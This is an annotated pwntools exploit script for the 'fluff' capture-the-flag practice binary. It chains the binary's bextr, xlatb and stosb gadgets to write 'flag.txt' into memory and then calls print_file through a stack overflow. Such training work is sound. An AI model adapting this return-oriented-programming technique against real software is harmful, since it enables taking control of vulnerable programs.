from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./fluff', checksec=False)
p = process()

# How many bytes to EIP?
offset = 40

# ROP
rop = ROP(elf)  # Load rop so we can access gadgets

# Address of .data section (size=10 bytes)
data_section_address = elf.symbols.data_start
info("%#x data_section_address", data_section_address)

# bextr = extract contiguous bits from rcx using index + length specified in rdx and write result to rbx - https://www.felixcloutier.com/x86/bextr
# pop rdx; - (index + length)
# pop rcx; - (byte we want to write)
# add rcx, 0x3ef2; - (we'll need to subtract this from our rcx value before hand?)
# bextr rbx, rcx, rdx; ret; - (perform bextr on rcx + rdx and place result in rbx)
bextr_rbx_rcx_rdx = elf.symbols.questionableGadgets + 2
info("%#x pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;", bextr_rbx_rcx_rdx)

# Place *ptr to the bextr result which is dl (rbx), into al (rax) ready for stosb
# https://www.felixcloutier.com/x86/xlat:xlatb
xlatb = elf.symbols.questionableGadgets   # Note: pwntools hides "non-trivial gadgets", docs advise using ropper/ROPGadget to list them all
info("%#x xlat BYTE PTR ds:[rbx]; ret;", xlatb)

# Pop address of .data section offset to RDI ready for stosb
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
info("%#x pop rdi; ret;", pop_rdi)

# Store string (byte) from al (LSB of rax) in memory location (*ptr) pointed to by rdi
# https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq
stosb_rdi_al = elf.symbols.questionableGadgets + 17  # stosb byte ptr [rdi], al; ret;
info("%#x pop rdi; ret;", pop_rdi)

string_to_write = b"flag.txt"  # String we want to write to memory
# Initial rax value (can find by breakpoint @ *pwnme+150 and checking rax)
current_rax = 0xb

for i, char in enumerate(string_to_write):
    # If dealing with first char, we use initial rax value defined above
    if(i != 0):
        # If not, set the current rax value to previous char
        current_rax = string_to_write[i - 1]

    # Find current char address
    char_addr = hex(read('fluff').find(char) + elf.address)
    info("%s found @ %s", chr(char), char_addr)
    # We subtract previous rax(because we are looping) + hardcoded value
    char_addr = int(char_addr, 16) - current_rax - 0x3ef2

    # Build ROP chain to deal with current char
    rop.raw([
        # Pop rdx (index + length), rcx (current char location)
        # Add rcx, 0x3ef2 (hence we subtract this)
        # bextr rbx, rcx, rdx (perform bit field extract)
        bextr_rbx_rcx_rdx,
        0x4000,  # Length = 40 (64 bits), Index = 00
        char_addr,  # Calculated above
        # Move bextr result from dl (rbx) into al (rax) ready for stos
        xlatb,
        # Pop our .data address location (with offset to current char) to rdi for stosb
        pop_rdi,
        data_section_address + i,
        # Store string (byte) from al (LSB of rax) in memory location pointed to by rdi
        stosb_rdi_al
    ])

# Call print file function with data section address as param
rop.print_file(data_section_address)

# Chain it together (get the raw ROP bytes)
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Build payload (inject rop_chain at offset)
payload = flat({
    offset: rop_chain
})

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
